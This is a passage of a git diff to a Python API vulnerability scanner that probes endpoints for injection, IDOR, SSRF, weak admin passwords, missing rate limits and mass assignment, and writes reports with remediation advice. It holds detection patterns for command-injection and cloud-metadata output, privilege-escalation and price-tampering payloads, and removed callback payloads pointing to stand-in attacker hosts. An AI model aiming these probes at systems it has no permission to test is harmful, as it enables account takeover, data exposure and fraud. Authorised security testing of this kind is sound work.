+                            print(f"{Colors.RED}[!] JWT algorithm confusion vulnerability{Colors.END}")
+                            break
+                    except:
+                        pass
+
+    def test_rate_limiting(self):
+        """Test for rate limiting bypass"""
+        print(f"\n{Colors.YELLOW}[*] Testing rate limiting...{Colors.END}")
+        
+        if not self.endpoints:
+            return
+        
+        test_endpoint = self.endpoints[0]
+        url = f"{self.base_url}{test_endpoint['endpoint']}"
+        
+        # Test basic rate limiting
+        success_count = 0
+        for i in range(50):
+            try:
+                response = self.session.request(
+                    test_endpoint['method'],
+                    url,
+                    timeout=5,
+                    verify=False,
+                    proxies=self.proxy
+                )
+                if response.status_code != 429:
+                    success_count += 1
+            except:
+                pass
+        
+        if success_count > 45:
+            self._add_finding(
+                endpoint=test_endpoint['endpoint'],
+                method=test_endpoint['method'],
+                vuln_type='Missing Rate Limiting',
+                severity='MEDIUM',
+                description='API endpoint lacks rate limiting protection',
+                payload='N/A',
+                response_code=200,
+                evidence=f'{success_count}/50 requests succeeded without rate limiting',
+                remediation='Implement rate limiting per IP, user, or API key.',
+                manipulation_details=f'{success_count} requests succeeded'
+            )
+            print(f"{Colors.YELLOW}[!] No rate limiting detected{Colors.END}")
 
     def fuzz_parameters(self, endpoint_data: Dict):
         """Fuzz endpoint parameters"""
@@ -250,7 +943,8 @@ class APIVulnScanner:
             'id', 'user', 'username', 'email', 'password', 'token',
             'file', 'filename', 'path', 'url', 'redirect', 'callback',
             'search', 'query', 'q', 'page', 'limit', 'offset',
-            'admin', 'role', 'permission', 'debug', 'test'
+            'admin', 'role', 'permission', 'debug', 'test',
+            'price', 'amount', 'quantity', 'discount'
         ]
         
         url = f"{self.base_url}{endpoint_data['endpoint']}"
@@ -264,8 +958,7 @@ class APIVulnScanner:
                 else:
                     response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
                 
-                # Check if parameter affected response
-                if response.status_code != 404 and response.status_code != 405:
+                if response.status_code not in [404, 405]:
                     found_params.append(param)
                     print(f"{Colors.GREEN}[✓] Found parameter: {param}{Colors.END}")
                     
@@ -290,12 +983,11 @@ class APIVulnScanner:
                     else:
                         response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                     
-                    # Detection patterns
                     sql_errors = [
                         'sql syntax', 'mysql', 'postgresql', 'oracle', 'sqlite',
                         'syntax error', 'unclosed quotation', 'quoted string',
                         'database error', 'warning: mysql', 'pg_query()',
-                        'sqlstate', 'db2 sql error', 'odbc driver'
+                        'sqlstate', 'db2 sql error', 'odbc driver', 'microsoft sql'
                     ]
                     
                     response_text = response.text.lower()
@@ -317,7 +1009,7 @@ class APIVulnScanner:
                             break
                     
                     # Time-based detection
-                    if 'WAITFOR' in payload or 'sleep' in payload.lower():
+                    if 'WAITFOR' in payload or 'SLEEP' in payload.upper():
                         if response.elapsed.total_seconds() > 4:
                             self._add_finding(
                                 endpoint=endpoint_data['endpoint'],
@@ -351,9 +1043,7 @@ class APIVulnScanner:
                     else:
                         response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                     
-                    # Check if payload reflected in response
                     if payload in response.text or urllib.parse.quote(payload) in response.text:
-                        # Additional verification
                         if '<script>' in response.text.lower() or 'onerror=' in response.text.lower() or 'onload=' in response.text.lower():
                             self._add_finding(
                                 endpoint=endpoint_data['endpoint'],
@@ -392,10 +1082,10 @@ class APIVulnScanner:
                     
                     elapsed = time.time() - start_time
                     
-                    # Detection patterns
                     cmd_patterns = [
                         'root:', 'bin:', 'daemon:', '/bin/bash', '/bin/sh',
-                        'uid=', 'gid=', '[boot loader]', 'PING', '64 bytes from'
+                        'uid=', 'gid=', '[boot loader]', 'PING', '64 bytes from',
+                        'www-data', 'nobody'
                     ]
                     
                     for pattern in cmd_patterns:
@@ -414,7 +1104,6 @@ class APIVulnScanner:
                             print(f"{Colors.RED}[!] Command Injection found in parameter: {param}{Colors.END}")
                             break
                     
-                    # Time-based detection for sleep commands
                     if 'sleep' in payload and elapsed > 4:
                         self._add_finding(
                             endpoint=endpoint_data['endpoint'],
@@ -448,7 +1137,6 @@ class APIVulnScanner:
                     else:
                         response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                     
-                    # Detection patterns
                     traversal_patterns = [
                         'root:', 'bin:', 'daemon:',
                         '[boot loader]', '[operating systems]',
@@ -490,10 +1178,10 @@ class APIVulnScanner:
                     else:
                         response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                     
-                    # Detection patterns for cloud metadata
                     ssrf_patterns = [
                         'ami-id', 'instance-id', 'security-credentials',
-                        'computeMetadata', 'latest/meta-data', 'AccessKeyId'
+                        'computeMetadata', 'latest/meta-data', 'AccessKeyId',
+                        'privateIp', 'publicIp'
                     ]
                     
                     for pattern in ssrf_patterns:
@@ -515,22 +1203,19 @@ class APIVulnScanner:
                 except Exception:
                     pass
 
-    def test_broken_object_level_authorization(self, endpoint_data: Dict, params: List[str]):
-        """API1:2023 - Test for Broken Object Level Authorization (BOLA)"""
-        print(f"{Colors.YELLOW}[*] Testing API1:2023 - Broken Object Level Authorization (BOLA)...{Colors.END}")
+    def test_idor(self, endpoint_data: Dict, params: List[str]):
+        """Test for Insecure Direct Object Reference vulnerabilities"""
+        print(f"{Colors.YELLOW}[*] Testing IDOR...{Colors.END}")
         
         url = f"{self.base_url}{endpoint_data['endpoint']}"
         
-        # Only test if endpoint likely has object references
-        if not any(keyword in endpoint_data['endpoint'].lower() for keyword in ['user', 'profile', 'account', 'order', 'document', 'file', 'message', 'post', 'comment', 'transaction']):
+        if not any(keyword in endpoint_data['endpoint'].lower() for keyword in ['user', 'profile', 'account', 'order', 'document', 'file']):
             return
         
         for param in params:
-            if param.lower() in ['id', 'user', 'userid', 'accountid', 'orderid', 'documentid', 'fileid', 'messageid', 'postid', 'commentid']:
+            if param.lower() in ['id', 'user', 'userid', 'accountid', 'orderid']:
                 responses = {}
-                status_codes = {}
                 
-                # Test with various object IDs
                 for test_id in self.payloads['idor']:
                     test_data = {param: test_id}
                     
@@ -540,34 +1225,25 @@ class APIVulnScanner:
                         else:
                             response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
                         
-                        # Store successful responses
                         if response.status_code == 200:
-                            responses[test_id] = {
-                                'length': len(response.content),
-                                'content_sample': response.text[:200]
-                            }
-                            status_codes[test_id] = response.status_code
+                            responses[test_id] = len(response.content)
                     
                     except Exception:
                         pass
                 
-                # If we got different content for different IDs, potential BOLA
-                if len(responses) > 1:
-                    content_lengths = [r['length'] for r in responses.values()]
-                    # Check if we got varying content (not all the same error page)
-                    if len(set(content_lengths)) > 1:
-                        self._add_finding(
-                            endpoint=endpoint_data['endpoint'],
-                            method=endpoint_data['method'],
-                            vuln_type='API1:2023 - Broken Object Level Authorization (BOLA)',
-                            severity='CRITICAL',
-                            description=f'BOLA vulnerability detected - unauthorized access to other users\' objects via parameter "{param}". API does not validate user ownership of requested objects.',
-                            payload=', '.join(responses.keys()),
-                            response_code=200,
-                            evidence=f'Multiple object IDs ({len(responses)}) accessible without proper authorization. Different content returned for different IDs indicating access to different user data.',
-                            remediation='Implement object-level authorization checks. Verify that the logged-in user has permission to access the requested object. Use random, unpredictable IDs instead of sequential integers.'
-                        )
-                        print(f"{Colors.RED}[!] BOLA (API1:2023) found in parameter: {param}{Colors.END}")
+                if len(responses) > 1 and len(set(responses.values())) > 1:
+                    self._add_finding(
+                        endpoint=endpoint_data['endpoint'],
+                        method=endpoint_data['method'],
+                        vuln_type='Insecure Direct Object Reference (IDOR)',
+                        severity='HIGH',
+                        description=f'IDOR vulnerability detected - unauthorized access to objects via parameter "{param}"',
+                        payload=', '.join(responses.keys()),
+                        response_code=200,
+                        evidence=f'Multiple object IDs accessible without proper authorization check',
+                        remediation='Implement proper authorization checks. Verify user permissions before accessing objects.'
+                    )
+                    print(f"{Colors.RED}[!] IDOR found in parameter: {param}{Colors.END}")
 
     def test_security_headers(self):
         """Test for missing security headers"""
@@ -652,296 +1328,9 @@ class APIVulnScanner:
             except Exception:
                 pass
 
-    def test_broken_object_property_authorization(self, endpoint_data: Dict, params: List[str]):
-        """API3:2023 - Test for Broken Object Property Level Authorization (Mass Assignment + Excessive Data Exposure)"""
-        print(f"{Colors.YELLOW}[*] Testing API3:2023 - Broken Object Property Level Authorization...{Colors.END}")
-        
-        url = f"{self.base_url}{endpoint_data['endpoint']}"
-        
-        # Test Mass Assignment - adding unauthorized properties
-        mass_assignment_payloads = [
-            {"isAdmin": True, "role": "admin"},
-            {"admin": True, "role": "administrator"},
-            {"permission": "admin", "privileges": "all"},
-            {"isActive": True, "verified": True},
-            {"balance": 99999, "credits": 99999},
-            {"discount": 100, "price": 0}
-        ]
-        
-        if endpoint_data['method'] in ['POST', 'PUT', 'PATCH']:
-            for payload in mass_assignment_payloads:
-                # Merge with existing params
-                test_data = {param: "test" for param in params}
-                test_data.update(payload)
-                
-                try:
-                    response = self.session.request(
-                        endpoint_data['method'],
-                        url,
-                        json=test_data,
-                        timeout=10,
-                        verify=False,
-                        proxies=self.proxy
-                    )
-                    
-                    # Check if server accepted unauthorized properties
-                    if response.status_code in [200, 201, 204]:
-                        response_lower = response.text.lower()
-                        # Check if our malicious properties appear in response
-                        for key in payload.keys():
-                            if key.lower() in response_lower:
-                                self._add_finding(
-                                    endpoint=endpoint_data['endpoint'],
-                                    method=endpoint_data['method'],
-                                    vuln_type='API3:2023 - Broken Object Property Level Authorization (Mass Assignment)',
-                                    severity='HIGH',
-                                    description=f'Mass assignment vulnerability detected. API accepts and processes unauthorized property "{key}" without proper authorization checks.',
-                                    payload=json.dumps(payload),
-                                    response_code=response.status_code,
-                                    evidence=f'Property "{key}" was accepted and reflected in response. This could allow privilege escalation or unauthorized data modification.',
-                                    remediation='Use allowlist of properties that clients are allowed to modify. Implement property-level authorization. Use DTOs/schemas to define allowed properties explicitly.'
-                                )
-                                print(f"{Colors.RED}[!] Mass Assignment (API3:2023) found - unauthorized property: {key}{Colors.END}")
-                                break
-                
-                except Exception:
-                    pass
-        
-        # Test Excessive Data Exposure - check if API returns sensitive fields
-        if endpoint_data['method'] == 'GET':
-            try:
-                response = self.session.get(url, timeout=10, verify=False, proxies=self.proxy)
-                
-                if response.status_code == 200:
-                    response_lower = response.text.lower()
-                    sensitive_fields = [
-                        'password', 'passwd', 'pwd', 'secret', 'token', 'api_key', 'apikey',
-                        'private_key', 'access_token', 'refresh_token', 'ssn', 'social_security',
-                        'credit_card', 'cvv', 'pin', 'salt', 'hash'
-                    ]
-                    
-                    found_sensitive = []
-                    for field in sensitive_fields:
-                        if field in response_lower:
-                            found_sensitive.append(field)
-                    
-                    if found_sensitive:
-                        self._add_finding(
-                            endpoint=endpoint_data['endpoint'],
-                            method=endpoint_data['method'],
-                            vuln_type='API3:2023 - Broken Object Property Level Authorization (Excessive Data Exposure)',
-                            severity='HIGH',
-                            description=f'API exposes sensitive data fields that should not be returned to clients.',
-                            payload='N/A',
-                            response_code=response.status_code,
-                            evidence=f'Sensitive fields detected in response: {", ".join(found_sensitive[:5])}. API may be returning full objects without filtering.',
-                            remediation='Implement response filtering. Only return properties that the client needs. Use DTOs to control what data is exposed. Never return sensitive fields like passwords or tokens.'
-                        )
-                        print(f"{Colors.RED}[!] Excessive Data Exposure (API3:2023) - sensitive fields: {', '.join(found_sensitive[:3])}{Colors.END}")
-            
-            except Exception:
-                pass
-
-    def test_broken_function_level_authorization(self, endpoint_data: Dict):
-        """API5:2023 - Test for Broken Function Level Authorization"""
-        print(f"{Colors.YELLOW}[*] Testing API5:2023 - Broken Function Level Authorization...{Colors.END}")
-        
-        # Check if endpoint contains admin/privileged function indicators
-        admin_indicators = ['admin', 'delete', 'remove', 'destroy', 'modify', 'update', 'create', 'add', 'manage']
-        
-        if not any(indicator in endpoint_data['endpoint'].lower() for indicator in admin_indicators):
-            return
-        
-        url = f"{self.base_url}{endpoint_data['endpoint']}"
-        
-        # Try accessing without authentication or with regular user credentials
-        try:
-            # Remove authentication headers to test unauthorized access
-            headers_no_auth = {k: v for k, v in self.headers.items() if 'auth' not in k.lower() and 'token' not in k.lower()}
-            
-            response = requests.request(
-                endpoint_data['method'],
-                url,
-                headers=headers_no_auth,
-                timeout=10,
-                verify=False,
-                proxies=self.proxy
-            )
-            
-            # If we get 200 instead of 401/403, potential BFLA
-            if response.status_code in [200, 201, 204]:
-                self._add_finding(
-                    endpoint=endpoint_data['endpoint'],
-                    method=endpoint_data['method'],
-                    vuln_type='API5:2023 - Broken Function Level Authorization (BFLA)',
-                    severity='CRITICAL',
-                    description='Administrative/privileged function accessible without proper authorization. Regular users may be able to perform administrative actions.',
-                    payload='Request without authentication headers',
-                    response_code=response.status_code,
-                    evidence=f'Administrative endpoint {endpoint_data["endpoint"]} returned {response.status_code} without proper authorization headers.',
-                    remediation='Implement function-level authorization checks. Verify user roles before executing administrative functions. Deny access by default and require explicit authorization for privileged operations.'
-                )
-                print(f"{Colors.RED}[!] Broken Function Level Authorization (API5:2023) - admin endpoint accessible{Colors.END}")
-        
-        except Exception:
-            pass
-
-    def test_broken_authentication(self):
-        """API2:2023 - Test for Broken Authentication vulnerabilities"""
-        print(f"\n{Colors.YELLOW}[*] Testing API2:2023 - Broken Authentication...{Colors.END}")
-        
-        auth_endpoints = [ep for ep in self.endpoints if any(x in ep['endpoint'].lower() for x in ['login', 'auth', 'signin', 'token', 'password'])]
-        
-        for endpoint_data in auth_endpoints:
-            url = f"{self.base_url}{endpoint_data['endpoint']}"
-            
-            # Test weak password acceptance
-            weak_passwords = ['123456', 'password', 'admin', '12345678', 'qwerty', 'abc123']
-            for pwd in weak_passwords:
-                test_data = {'username': 'admin', 'password': pwd}
-                
-                try:
-                    response = self.session.post(url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
-                    
-                    # If weak password accepted (200 or token in response)
-                    if response.status_code == 200 or 'token' in response.text.lower():
-                        self._add_finding(
-                            endpoint=endpoint_data['endpoint'],
-                            method='POST',
-                            vuln_type='API2:2023 - Broken Authentication (Weak Password)',
-                            severity='CRITICAL',
-                            description='API accepts weak passwords without proper validation.',
-                            payload=f"username: admin, password: {pwd}",
-                            response_code=response.status_code,
-                            evidence=f'Weak password "{pwd}" was accepted by the authentication endpoint.',
-                            remediation='Implement strong password policies. Require minimum length, complexity. Use password strength meters. Reject commonly used passwords.'
-                        )
-                        print(f"{Colors.RED}[!] Weak password accepted (API2:2023): {pwd}{Colors.END}")
-                        break
-                
-                except Exception:
-                    pass
-            
-            # Test for credential stuffing vulnerability (lack of rate limiting on auth)
-            # This is part of API4:2023 but specifically for auth endpoints
-            attempts = 0
-            for i in range(15):  # Try 15 rapid requests
-                try:
-                    test_data = {'username': f'user{i}', 'password': 'test123'}
-                    response = self.session.post(url, json=test_data, timeout=5, verify=False, proxies=self.proxy)
-                    if response.status_code not in [429, 403]:  # Not rate limited
-                        attempts += 1
-                except Exception:
-                    break
-            
-            if attempts >= 10:
-                self._add_finding(
-                    endpoint=endpoint_data['endpoint'],
-                    method='POST',
-                    vuln_type='API2:2023 - Broken Authentication (No Rate Limiting)',
-                    severity='HIGH',
-                    description='Authentication endpoint lacks rate limiting, enabling brute-force and credential stuffing attacks.',
-                    payload='Multiple rapid authentication attempts',
-                    response_code=200,
-                    evidence=f'Successfully made {attempts} authentication attempts without being rate-limited or blocked.',
-                    remediation='Implement rate limiting on authentication endpoints. Use CAPTCHA after failed attempts. Implement account lockout mechanisms. Monitor for suspicious authentication patterns.'
-                )
-                print(f"{Colors.RED}[!] No rate limiting on auth endpoint (API2:2023){Colors.END}")
-
-    def test_unrestricted_resource_consumption(self):
-        """API4:2023 - Test for Unrestricted Resource Consumption"""
-        print(f"\n{Colors.YELLOW}[*] Testing API4:2023 - Unrestricted Resource Consumption...{Colors.END}")
-        
-        # Test rate limiting on various endpoints
-        for endpoint_data in self.endpoints[:3]:  # Test first 3 endpoints
-            url = f"{self.base_url}{endpoint_data['endpoint']}"
-            
-            # Make rapid requests to test rate limiting
-            attempts = 0
-            rate_limited = False
-            
-            for i in range(50):  # 50 rapid requests
-                try:
-                    response = self.session.request(
-                        endpoint_data['method'],
-                        url,
-                        timeout=5,
-                        verify=False,
-                        proxies=self.proxy
-                    )
-                    
-                    if response.status_code == 429:  # Rate limited
-                        rate_limited = True
-                        break
-                    
-                    if response.status_code not in [404, 500, 502, 503]:
-                        attempts += 1
-                
-                except Exception:
-                    break
-            
-            # If we made many requests without rate limiting
-            if attempts >= 30 and not rate_limited:
-                self._add_finding(
-                    endpoint=endpoint_data['endpoint'],
-                    method=endpoint_data['method'],
-                    vuln_type='API4:2023 - Unrestricted Resource Consumption',
-                    severity='MEDIUM',
-                    description='API endpoint lacks proper rate limiting, allowing unrestricted resource consumption.',
-                    payload='50 rapid requests',
-                    response_code=200,
-                    evidence=f'Successfully made {attempts} requests without rate limiting (HTTP 429). This could lead to DoS or excessive operational costs.',
-                    remediation='Implement rate limiting per user/IP. Set maximum request quotas. Monitor resource usage. Implement throttling for expensive operations. Use API gateways with built-in rate limiting.'
-                )
-                print(f"{Colors.YELLOW}[!] No rate limiting detected (API4:2023) on {endpoint_data['endpoint']}{Colors.END}")
-                break
-
-    def test_unsafe_api_consumption(self, endpoint_data: Dict, params: List[str]):
-        """API10:2023 - Test for Unsafe Consumption of APIs"""
-        print(f"{Colors.YELLOW}[*] Testing API10:2023 - Unsafe Consumption of APIs...{Colors.END}")
-        
-        url = f"{self.base_url}{endpoint_data['endpoint']}"
-        
-        # Test if API accepts data from external sources without validation
-        malicious_payloads = [
-            {"url": "http://malicious-api.com/data"},
-            {"callback": "http://attacker.com/webhook"},
-            {"api_endpoint": "http://evil.com/api"},
-            {"webhook": "http://attacker-site.com/hook"}
-        ]
-        
-        for param in params:
-            if any(keyword in param.lower() for keyword in ['url', 'callback', 'webhook', 'api', 'endpoint', 'source']):
-                for payload in malicious_payloads:
-                    test_data = {param: list(payload.values())[0]}
-                    
-                    try:
-                        if endpoint_data['method'] == 'GET':
-                            response = self.session.get(url, params=test_data, timeout=10, verify=False, proxies=self.proxy)
-                        else:
-                            response = self.session.request(endpoint_data['method'], url, json=test_data, timeout=10, verify=False, proxies=self.proxy)
-                        
-                        # Check if API processed the external URL
-                        if response.status_code in [200, 201]:
-                            self._add_finding(
-                                endpoint=endpoint_data['endpoint'],
-                                method=endpoint_data['method'],
-                                vuln_type='API10:2023 - Unsafe Consumption of APIs',
-                                severity='MEDIUM',
-                                description=f'API accepts and may process data from external sources via parameter "{param}" without proper validation.',
-                                payload=json.dumps(payload),
-                                response_code=response.status_code,
-                                evidence='API accepted external URL/callback without validation. This could allow attackers to inject malicious API responses or webhooks.',
-                                remediation='Validate and sanitize data from external APIs. Use allowlists for external services. Implement certificate pinning. Validate redirect URLs. Treat third-party API responses with same scrutiny as user input.'
-                            )
-                            print(f"{Colors.YELLOW}[!] Unsafe API Consumption (API10:2023) in parameter: {param}{Colors.END}")
-                            break
-                    
-                    except Exception:
-                        pass
-
     def _add_finding(self, endpoint: str, method: str, vuln_type: str, severity: str,
-                     description: str, payload: str, response_code: int, evidence: str, remediation: str):
+                     description: str, payload: str, response_code: int, evidence: str, 
+                     remediation: str, manipulation_details: str = ""):
         """Add a finding to the results"""
         finding = Finding(
             endpoint=endpoint,
@@ -953,12 +1342,13 @@ class APIVulnScanner:
             response_code=response_code,
             evidence=evidence,
             remediation=remediation,
-            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+            timestamp=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            manipulation_details=manipulation_details
         )
         self.findings.append(finding)
 
     def run_full_scan(self, wordlist: List[str] = None):
-        """Execute complete OWASP API Security Top 10 2023 vulnerability scan"""
+        """Execute complete vulnerability scan"""
         self.print_banner()
         
         # Phase 1: Discovery
@@ -968,8 +1358,8 @@ class APIVulnScanner:
             print(f"{Colors.RED}[!] No endpoints discovered. Exiting.{Colors.END}")
             return
         
-        # Phase 2: Vulnerability Testing - OWASP API Security Top 10 2023
-        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP API Security Top 10 2023 Vulnerability Testing{Colors.END}")
+        # Phase 2: Vulnerability Testing
+        print(f"\n{Colors.BOLD}[+] Phase 3: OWASP Top 10 Vulnerability Testing{Colors.END}")
         
         for endpoint_data in self.endpoints:
             print(f"\n{Colors.CYAN}[*] Testing: {endpoint_data['method']} {endpoint_data['endpoint']}{Colors.END}")
@@ -978,31 +1368,26 @@ class APIVulnScanner:
             params = self.fuzz_parameters(endpoint_data)
             
             if params:
-                # Run OWASP API Security Top 10 2023 tests
-                self.test_broken_object_level_authorization(endpoint_data, params)  # API1:2023
-                # API2:2023 - Broken Authentication (tested separately)
-                self.test_broken_object_property_authorization(endpoint_data, params)  # API3:2023
-                # API4:2023 - Unrestricted Resource Consumption (tested separately)
-                self.test_broken_function_level_authorization(endpoint_data)  # API5:2023
-                # API6:2023 - Unrestricted Access to Sensitive Business Flows (requires business logic understanding)
-                self.test_ssrf(endpoint_data, params)  # API7:2023
-                # API8:2023 - Security Misconfiguration (tested separately)
-                # API9:2023 - Improper Inventory Management (handled by discovery phase)
-                self.test_unsafe_api_consumption(endpoint_data, params)  # API10:2023
-                
-                # Also test common web vulnerabilities that affect APIs
+                # Run all vulnerability tests
                 self.test_sql_injection(endpoint_data, params)
                 self.test_xss(endpoint_data, params)
                 self.test_command_injection(endpoint_data, params)
                 self.test_path_traversal(endpoint_data, params)
+                self.test_ssrf(endpoint_data, params)
+                self.test_idor(endpoint_data, params)
             
             # Test XXE regardless of parameters
             self.test_xxe(endpoint_data)
+            
+            # Test API data manipulation for POST/PUT/PATCH endpoints with JSON
+            if endpoint_data.get('has_json'):
+                self.test_api_data_manipulation(endpoint_data)
         
-        # Phase 3: General API security tests
+        # Phase 3: Additional API-specific tests
+        self.test_graphql_introspection()
+        self.test_authentication_bypass()
+        self.test_rate_limiting()
         self.test_security_headers()
-        self.test_broken_authentication()
-        self.test_unrestricted_resource_consumption()
         
         # Generate report
         self.generate_report()
@@ -1034,6 +1419,8 @@ class APIVulnScanner:
         print(f"Target: {self.base_url}")
         print(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
         print(f"Total Vulnerabilities: {len(self.findings)}")
+        print(f"Endpoints Analyzed: {len(self.endpoints)}")
+        print(f"JSON Patterns Discovered: {len(self.json_patterns)}")
         print(f"\n{Colors.RED}Critical: {summary['CRITICAL']}{Colors.END} | " +
               f"{Colors.YELLOW}High: {summary['HIGH']}{Colors.END} | " +
               f"{Colors.CYAN}Medium: {summary['MEDIUM']}{Colors.END} | " +
@@ -1044,7 +1431,7 @@ class APIVulnScanner:
         print(f"{'─'*100}")
         
         # Table header
-        header = f"{'#':<4} {'SEVERITY':<10} {'TYPE':<30} {'ENDPOINT':<40} {'METHOD':<8}"
+        header = f"{'#':<4} {'SEVERITY':<10} {'TYPE':<35} {'ENDPOINT':<40} {'METHOD':<8}"
         print(f"{Colors.BOLD}{header}{Colors.END}")
         print(f"{'─'*100}")
         
@@ -1058,7 +1445,7 @@ class APIVulnScanner:
             }.get(finding.severity, Colors.WHITE)
             
             row = f"{idx:<4} {severity_color}{finding.severity:<10}{Colors.END} " +\
-                  f"{finding.vulnerability_type:<30} {finding.endpoint:<40} {finding.method:<8}"
+                  f"{finding.vulnerability_type:<35} {finding.endpoint[:38]:<40} {finding.method:<8}"
             print(row)
         
         print(f"\n{'='*100}\n")
@@ -1079,9 +1466,11 @@ class APIVulnScanner:
             print(f"Endpoint:      {finding.method} {finding.endpoint}")
             print(f"Description:   {finding.description}")
             print(f"Evidence:      {finding.evidence}")
-            print(f"Payload:       {finding.payload[:100]}{'...' if len(finding.payload) > 100 else ''}")
+            print(f"Payload:       {finding.payload[:150]}{'...' if len(finding.payload) > 150 else ''}")
             print(f"HTTP Code:     {finding.response_code}")
             print(f"Timestamp:     {finding.timestamp}")
+            if finding.manipulation_details:
+                print(f"Manipulation:  {finding.manipulation_details}")
             print(f"\n{Colors.CYAN}Remediation:{Colors.END}")
             print(f"  {finding.remediation}")
             print(f"\n{'─'*100}\n")
@@ -1099,10 +1488,14 @@ class APIVulnScanner:
             'scan_info': {
                 'target': self.base_url,
                 'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-                'total_vulnerabilities': len(self.findings)
+                'total_vulnerabilities': len(self.findings),
+                'endpoints_analyzed': len(self.endpoints),
+                'json_patterns_discovered': len(self.json_patterns),
+                'cookies_used': bool(self.cookies)
             },
             'summary': summary,
-            'findings': [asdict(f) for f in sorted_findings]
+            'findings': [asdict(f) for f in sorted_findings],
+            'json_patterns': self.json_patterns[:10]  # Include first 10 patterns
         }
         
         with open(json_filename, 'w') as f:
@@ -1146,16 +1539,18 @@ class APIVulnScanner:
         tr:hover {{ background: #f8f9fa; }}
         .vuln-detail {{ margin: 20px 0; padding: 20px; border-left: 4px solid #3498db; background: #ecf0f1; }}
         .severity-badge {{ padding: 5px 10px; border-radius: 3px; color: white; font-weight: bold; }}
-        .code {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto; }}
+        .code {{ background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; overflow-x: auto; font-family: monospace; }}
+        .manipulation {{ background: #3498db; color: white; padding: 8px; margin: 5px 0; border-radius: 3px; }}
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>🛡️ API Vulnerability Assessment Report</h1>
-            <p><strong>Ghost Ops Security</strong></p>
+            <h1>🛡️ API Vulnerability Assessment Report v2.0</h1>
+            <p><strong>Ghost Ops Security</strong> - Advanced API Testing with Pattern Analysis</p>
             <p>Target: {self.base_url}</p>
             <p>Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+            <p>Endpoints Analyzed: {len(self.endpoints)} | JSON Patterns: {len(self.json_patterns)}</p>
         </div>
         
         <h2>Executive Summary</h2>
@@ -1209,14 +1604,19 @@ class APIVulnScanner:
         
         for idx, finding in enumerate(sorted_findings, 1):
             severity_class = finding.severity.lower()
+            manipulation_html = ""
+            if finding.manipulation_details:
+                manipulation_html = f'<div class="manipulation"><strong>Data Manipulation:</strong> {finding.manipulation_details}</div>'
+            
             html += f"""
         <div class="vuln-detail">
             <h3>[{idx}] <span class="severity-badge {severity_class}">{finding.severity}</span> {finding.vulnerability_type}</h3>
             <p><strong>Endpoint:</strong> {finding.method} {finding.endpoint}</p>
             <p><strong>Description:</strong> {finding.description}</p>
             <p><strong>Evidence:</strong> {finding.evidence}</p>
+            {manipulation_html}
             <p><strong>Payload:</strong></p>
-            <div class="code">{finding.payload[:200]}{'...' if len(finding.payload) > 200 else ''}</div>
+            <div class="code">{finding.payload[:300]}{'...' if len(finding.payload) > 300 else ''}</div>
             <p><strong>HTTP Response Code:</strong> {finding.response_code}</p>
             <p><strong>Timestamp:</strong> {finding.timestamp}</p>
             <p><strong>Remediation:</strong> {finding.remediation}</p>
@@ -1232,14 +1632,82 @@ class APIVulnScanner:
 
 
 def main():
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
+║           API VULNERABILITY SCANNER v2.0 - Ghost Ops Security             ║
+║        Advanced OWASP API Security Testing with Pattern Analysis          ║
+╚═══════════════════════════════════════════════════════════════════════════╝{Colors.END}
+"""
+    
     parser = argparse.ArgumentParser(
-        description='API Vulnerability Scanner - Ghost Ops Security',
+        description=banner,
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="""
-Examples:
-  python api_vuln_scanner.py -u https://api.example.com
-  python api_vuln_scanner.py -u https://api.example.com -H "Authorization: Bearer TOKEN" -t 20
-  python api_vuln_scanner.py -u https://api.example.com -w endpoints.txt --proxy http://127.0.0.1:8080
+        epilog=f"""
+{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
+USAGE EXAMPLES
+═══════════════════════════════════════════════════════════════════════════{Colors.END}
+
+{Colors.GREEN}Basic Scan:{Colors.END}
+  python3 %(prog)s -u https://api.example.com
+
+{Colors.GREEN}With JWT Authentication:{Colors.END}
+  python3 %(prog)s -u https://api.example.com \\
+    -H "Authorization: Bearer eyJhbGc..."
+
+{Colors.GREEN}With Cookie Authentication:{Colors.END}
+  python3 %(prog)s -u https://api.example.com \\
+    --cookie "session=abc123;PHPSESSID=xyz789"
+
+{Colors.GREEN}With Multiple Headers:{Colors.END}
+  python3 %(prog)s -u https://api.example.com \\
+    -H "Authorization: Bearer TOKEN" \\
+    -H "X-API-Key: your-key" \\
+    -H "Content-Type: application/json"
+
+{Colors.GREEN}Complete E-commerce Pentest:{Colors.END}
+  python3 %(prog)s -u https://api.shop.com \\
+    -H "Authorization: Bearer TOKEN" \\
+    --cookie "cart=xyz;session=abc" \\
+    -w endpoints.txt \\
+    -t 15 \\
+    --proxy http://127.0.0.1:8080
+
+{Colors.GREEN}Through Burp Suite:{Colors.END}
+  python3 %(prog)s -u https://api.example.com \\
+    -H "Authorization: Bearer TOKEN" \\
+    --proxy http://127.0.0.1:8080
+
+{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
+KEY FEATURES
+═══════════════════════════════════════════════════════════════════════════{Colors.END}
+
+{Colors.YELLOW}✓{Colors.END} JSON Pattern Analysis         - Intelligent field discovery
+{Colors.YELLOW}✓{Colors.END} API Data Manipulation         - Automated exploitation (50+ tests)
+{Colors.YELLOW}✓{Colors.END} Cookie Authentication         - Session-based auth support
